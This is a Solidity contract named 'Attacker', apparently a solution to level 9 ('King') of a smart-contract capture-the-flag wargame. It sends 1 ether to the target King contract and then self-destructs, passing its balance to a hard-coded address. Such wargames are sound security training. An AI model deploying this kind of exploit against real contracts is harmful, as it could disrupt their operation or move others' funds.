// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "src/level09.sol";

contract Attacker
{
    King level09;

    constructor(address payable _level09)
    {
        level09 = King(_level09);
    } 

    function attack() external
    {
        payable(address(level09)).call{value: 1 ether}("");
        selfdestruct(payable(address(0x6025dCF80ac58FC9Bf3Dc3cBb1572A0A44dafE0a)));
    }

    function getBalance() external returns (uint) 
    {
        return address(this).balance;
    }


    receive() external payable { }
}